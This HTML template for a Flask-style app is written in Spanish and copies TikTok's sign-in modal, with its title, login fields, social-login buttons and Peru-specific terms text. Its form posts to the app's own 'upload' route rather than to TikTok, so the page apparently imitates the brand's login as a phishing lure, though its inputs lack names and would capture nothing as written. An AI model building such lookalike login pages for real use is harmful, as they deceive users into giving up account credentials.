<!-- login.html -->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en TikTok</title>
    <style>
        /* Estilos CSS del modal */
        .modal {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 300px;
            margin: 0 auto;
        }

        .modal h2 {
            margin-top: 0;
            color: #333;
        }

        .modal input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            box-sizing: border-box;
        }

        .modal button {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px 0;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
        }

        .modal button.facebook {
            background-color: #3b5998;
        }

        .modal button.guest {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px 0;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
        }

        .modal button.register {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px 0;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="modal">
        <h2>Iniciar sesión en TikTok</h2>
        <form action="{{ url_for('upload') }}" method="post" enctype="multipart/form-data">
            <input type="text" placeholder="Usar código QR">
            <input type="text" placeholder="Usar teléfono/correo/nombre de usuario">
            <button class="facebook">Continuar con Facebook</button>
            <button class="google">Continuar con Google</button>
            <button class="twitter">Continuar con Twitter</button>
            <button class="apple">Continuar con Apple</button>
            <button class="guest">Seguir como invitado</button>
            <button class="register">Registrarse</button>
            <p>Al seguir usando una cuenta en Perú, aceptas los <a href="#">Términos de uso</a> y confirmas que has leído la <a href="#">Política de privacidad</a>.</p>
            <p>¿No tienes cuenta? <a href="#">Registrarse</a></p>
        </form>
    </div>
</body>
</html>
